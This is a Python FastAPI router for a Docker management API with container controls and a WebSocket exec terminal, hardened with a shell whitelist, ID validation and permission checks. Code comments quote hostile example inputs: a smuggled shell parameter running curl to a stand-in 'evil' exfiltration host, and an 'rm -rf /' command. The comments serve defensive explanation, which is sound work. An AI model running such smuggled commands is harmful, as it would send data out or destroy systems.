from fastapi import APIRouter, Depends, status, Request, WebSocket, WebSocketDisconnect, Query, HTTPException
from sse_starlette.sse import EventSourceResponse
from api.auth.jwt import get_auth_wrapper, get_secret_key
from api.auth.auth import auth_check
import api.actions.containers as actions
import asyncio
import aiodocker
from aiodocker.exceptions import DockerError
import logging
import jwt
import json
from api.settings import Settings
import shlex
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from api.utils.auth import get_db
from api.db.database import SessionLocal
from api.db.models.users import User
from api.utils.audit import log_activity
import asyncio

logger = logging.getLogger(__name__)
settings = Settings()

router = APIRouter()


# Only these shell paths can be invoked through the exec WebSocket. Anything
# else is rejected before we open the docker exec stream. Previously the
# `shell` query parameter was forwarded to shlex.split + aiodocker.exec
# verbatim, which let a caller smuggle a full command line via something
# like ?shell=/bin/sh+-c+'curl%20evil/exfil'.
# Valid container identifiers per Docker: either a hex id (12 or 64 chars,
# but the daemon accepts any prefix >= 1) or a name matching the docker
# name regex `[a-zA-Z0-9][a-zA-Z0-9_.-]*`. We accept the union and cap at
# 255 chars so a hostile caller can't smuggle URL-path tricks through the
# `{container_id}` placeholder into the aiodocker client.
import re as _re
_CONTAINER_ID_RE = _re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.-]{0,254}$")


def _validate_container_id(container_id: str) -> str:
    if not isinstance(container_id, str) or not _CONTAINER_ID_RE.match(container_id):
        raise HTTPException(status_code=400, detail="Invalid container id")
    return container_id


ALLOWED_EXEC_SHELLS = frozenset({
    "/bin/sh",
    "/bin/bash",
    "/bin/ash",
    "/bin/zsh",
    "/usr/bin/sh",
    "/usr/bin/bash",
    "/usr/bin/ash",
    "/usr/bin/zsh",
    "sh",
    "bash",
    "ash",
    "zsh",
})

@router.get("/stats")
async def get_all_container_stats(
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """
    Get stats for all running containers (Optimized & Cached)
    """
    await auth_check(Authorize)
    return await actions.get_all_stats()

@router.get("/")
async def get_containers(
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """
    List all containers
    """
    await auth_check(Authorize)
    return await actions.get_containers()

@router.get("/{container_id}/logs")
async def get_container_logs(
    request: Request,
    container_id: str,
    tail: int = 100,
    follow: bool = True,
    timestamps: bool = False,
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """
    Streams container logs using Docker API
    """
    await auth_check(Authorize)
    return EventSourceResponse(
        actions.get_logs_generator(container_id, tail, follow, timestamps)
    )

@router.get("/{container_id}/stats")
async def get_container_stats(
    container_id: str,
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """
    Returns current CPU/RAM usage
    """
    await auth_check(Authorize)
    return await actions.get_stats(container_id)

@router.get("/{container_id}/stats/stream")
async def stream_container_stats(
    request: Request,
    container_id: str,
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """Echtzeit-Stream für CPU/RAM Metriken via SSE"""
    await auth_check(Authorize)
    return EventSourceResponse(actions.stream_stats_generator(request, container_id))

@router.post("/{container_id}/start")
async def start_container(
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    user = await Authorize.get_jwt_subject()

    # Perform action
    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.start()
        await asyncio.to_thread(log_activity, db, user, "start", container_id)
        return {"message": "Container started"}
    except DockerError as e:
        # Map docker daemon errors to their proper HTTP status (404 for
        # "no such container", 409 for "already started", etc.) instead
        # of collapsing everything to 500 with the raw message — which
        # could echo internal paths / daemon details back to the client.
        logger.error("Error starting container %s: %s", container_id, e)
        status_code = getattr(e, "status", 500) or 500
        raise HTTPException(status_code=status_code, detail="Failed to start container")
    except Exception as e:
        logger.exception("Unexpected error starting container %s", container_id)
        raise HTTPException(status_code=500, detail="Internal error")
    finally:
        await docker.close()

@router.post("/{container_id}/stop")
async def stop_container(
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    user = await Authorize.get_jwt_subject()

    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.stop()
        await asyncio.to_thread(log_activity, db, user, "stop", container_id)
        return {"message": "Container stopped"}
    except DockerError as e:
        logger.error("Error stopping container %s: %s", container_id, e)
        status_code = getattr(e, "status", 500) or 500
        raise HTTPException(status_code=status_code, detail="Failed to stop container")
    except Exception:
        logger.exception("Unexpected error stopping container %s", container_id)
        raise HTTPException(status_code=500, detail="Internal error")
    finally:
        await docker.close()

@router.post("/{container_id}/restart")
async def restart_container(
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    user = await Authorize.get_jwt_subject()

    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.restart()
        await asyncio.to_thread(log_activity, db, user, "restart", container_id)
        return {"message": "Container restarted"}
    except DockerError as e:
        logger.error("Error restarting container %s: %s", container_id, e)
        status_code = getattr(e, "status", 500) or 500
        raise HTTPException(status_code=status_code, detail="Failed to restart container")
    except Exception:
        logger.exception("Unexpected error restarting container %s", container_id)
        raise HTTPException(status_code=500, detail="Internal error")
    finally:
        await docker.close()

@router.delete("/{container_id}")
async def delete_container(
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    container_id = _validate_container_id(container_id)
    user = await Authorize.get_jwt_subject()

    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.delete(force=True)
        await asyncio.to_thread(log_activity, db, user, "delete", container_id)
        return {"message": "Container deleted"}
    except DockerError as e:
        # 404 for "no such container" is the right answer — the previous
        # blanket 500 made it impossible for the frontend to distinguish
        # "you deleted something that never existed" from "the docker
        # daemon is unreachable".
        logger.error("Error deleting container %s: %s", container_id, e)
        status_code = getattr(e, "status", 500) or 500
        if status_code == 404:
            raise HTTPException(status_code=404, detail="Container not found")
        raise HTTPException(status_code=status_code, detail="Failed to delete container")
    except Exception:
        logger.exception("Unexpected error deleting container %s", container_id)
        raise HTTPException(status_code=500, detail="Internal error")
    finally:
        await docker.close()

@router.websocket("/{container_id}/exec")
async def container_exec(
    websocket: WebSocket,
    container_id: str,
    shell: str = Query("/bin/sh"),
    cols: int = Query(80),
    rows: int = Query(24)
):
    """
    WebSocket endpoint for container exec (terminal)
    """
    await websocket.accept()

    # Validate the shell argument before doing anything else. The whitelist
    # blocks ?shell=/bin/sh -c 'rm -rf /' style smuggling where shlex.split
    # would happily turn the parameter into a multi-token command.
    if shell.strip() not in ALLOWED_EXEC_SHELLS:
        logger.warning("WebSocket exec rejected: disallowed shell %r", shell)
        await websocket.send_json({"error": "Forbidden: shell not allowed"})
        await websocket.close(code=1008)
        return

    # Check Auth + AuthZ
    # The previous implementation only verified the JWT signature; any valid
    # token — including a short-lived setup_pending token — granted shell access
    # to any container. Validate the claim set and the user's runtime
    # permissions before opening a stream.
    if settings.DISABLE_AUTH:
        pass  # local/dev mode: skip all auth checks
    else:
        try:
            token = websocket.cookies.get("access_token_cookie")
            if not token:
                raise Exception("No token")
            claims = jwt.decode(token, get_secret_key(), algorithms=["HS256"])
        except Exception as e:
            logger.error(f"WebSocket Auth Error: {e}")
            await websocket.send_json({"error": "Unauthorized"})
            await websocket.close(code=1008)
            return

        if claims.get("setup_pending"):
            # %r so any newlines/CR/escape sequences in a hostile `sub`
            # claim get quoted instead of fragmenting the log line (log
            # injection / forging fake entries against a downstream
            # log aggregator).
            logger.warning(
                "WebSocket exec rejected: setup_pending token for user %r",
                claims.get("sub"),
            )
            await websocket.send_json({"error": "Forbidden: setup not completed"})
            await websocket.close(code=1008)
            return

        username = claims.get("sub")
        if not username:
            await websocket.send_json({"error": "Unauthorized"})
            await websocket.close(code=1008)
            return

        auth_db = SessionLocal()
        try:
            result = await auth_db.execute(select(User).filter(User.username == username))
            user = result.scalars().first()
        finally:
            await auth_db.close()

        if not user or not user.is_active:
            logger.warning("WebSocket exec rejected: inactive or unknown user %r", username)
            await websocket.send_json({"error": "Forbidden"})
            await websocket.close(code=1008)
            return

        # Shell access to a running container is equivalent to start/stop
        # capability for the container's payload. Gate it behind perm_start
        # (admins implicitly pass).
        if not user.is_superuser and not getattr(user, "perm_start", False):
            logger.warning("WebSocket exec rejected: user %r lacks perm_start", username)
            await websocket.send_json({"error": "Forbidden: missing permission"})
            await websocket.close(code=1008)
            return

    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    exec_id = None
    stream = None

    try:
        # Create exec instance
        # Ensure container exists
        try:
            container = await docker.containers.get(container_id)
        except Exception as e:
            logger.error(f"Container not found error: {e}")
            await websocket.close(code=1008, reason="Container not found")
            return

        exec_instance = await container.exec(
            cmd=shlex.split(shell),
            stdin=True,
            stdout=True,
            stderr=True,
            privileged=False,
            tty=True,
            environment=["TERM=xterm"]
        )

        # Now start it. We need a stream.
        stream = exec_instance.start(detach=False)

        if stream is None:
             raise Exception("Failed to start exec stream")

        # We need to handle resizing.
        # Run resize in background to avoid blocking initial connection
        async def resize_exec():
            try:
                await exec_instance.resize(w=cols, h=rows)
            except Exception as e:
                logger.error(f"Resize error: {e}")

        asyncio.create_task(resize_exec())

        # Task to read from docker and send to websocket
        async def read_from_docker():
            try:
                # stream.read_out() yields data
                while True:
                    msg = await stream.read_out()
                    if msg is None:
                        break
                    # msg is bytes?
                    # xterm expects string or bytes.
                    if msg.data:
                         # Deliberately NOT logging msg.data — raw terminal
                         # output can include passwords typed at sudo prompts,
                         # tokens emitted by tools, etc. Semgrep flagged this
                         # (log-leak rule) and the flag was correct; only the
                         # frame length is safe to record.
                         logger.debug("OUT: %d bytes", len(msg.data))
                         await websocket.send_bytes(msg.data)
            except Exception as e:
                logger.error(f"Read from docker error: {e}")

        # Task to read from websocket and write to docker
        async def write_to_docker():
            try:
                while True:
                    data = await websocket.receive()
                    # data can be bytes or text.

                    if "text" in data:
                        input_data = data["text"]

                        try:
                            cmd = None
                            if input_data.startswith("{"):
                                cmd = json.loads(input_data)

                            if cmd and cmd.get("type") == "resize":
                                await exec_instance.resize(w=cmd["cols"], h=cmd["rows"])
                                continue
                        except (json.JSONDecodeError, KeyError, TypeError) as parse_err:
                            # Not a JSON control frame -> fall through and forward
                            # the raw bytes to the container's stdin.
                            logger.debug(f"WS input not a control frame: {parse_err}")

                        # Send to docker. Same reasoning as the OUT path:
                        # never log the raw user input — it's a live shell,
                        # so the bytes include passwords / API tokens / etc.
                        logger.debug("IN: %d bytes", len(input_data))
                        await stream.write_in(input_data.encode())

                    elif "bytes" in data:
                        await stream.write_in(data["bytes"])

                    if data.get("type") == "websocket.disconnect":
                        break

            except WebSocketDisconnect:
                pass
            except Exception as e:
                logger.error(f"Write to docker error: {e}")

        # Run tasks
        reader = asyncio.create_task(read_from_docker())
        writer = asyncio.create_task(write_to_docker())

        await asyncio.wait([reader, writer], return_when=asyncio.FIRST_COMPLETED)

        reader.cancel()
        writer.cancel()

    except aiodocker.exceptions.DockerError:
        # The previous code echoed the full DockerError message into the
        # WS close `reason` field, which is visible to any caller. That
        # leaked internal daemon details (file paths, container ids,
        # capability names) on every failure. Keep the detail in the
        # server log and send a generic reason over the wire.
        logger.exception("Docker exec error for container %s", container_id)
        await websocket.close(code=1011, reason="Docker error")
    except Exception:
        logger.exception("Unexpected error in shell for container %s", container_id)
        try:
            await websocket.close(code=1011, reason="Internal error")
        except Exception:
            # Socket may already be closed; nothing we can do — but the
            # stack trace above already captured the real cause.
            logger.debug("WS close after error failed", exc_info=True)
    finally:
        if docker:
            await docker.close()
